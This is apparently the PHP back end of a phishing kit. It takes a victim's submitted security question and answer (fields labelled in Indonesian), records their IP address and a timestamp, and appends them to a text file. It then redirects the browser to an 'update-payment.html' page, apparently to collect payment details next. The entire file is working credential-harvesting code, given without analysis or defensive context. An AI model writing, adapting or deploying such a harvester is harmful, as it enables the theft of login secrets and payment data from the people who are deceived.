<?php
$file = "welcome-------2018-------fuck-------you-------mark.txt";
$username = $_POST['birthday_captcha_month'];
$password = $_POST['pass1'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,");
fwrite($handle, "\n");
fwrite($handle, "Pertanyaan	: ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Jawaban	        : ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted	: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, ",,,,,,,,,,,,,,,,,");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"update-payment.html\";
// -->
</script>";
?>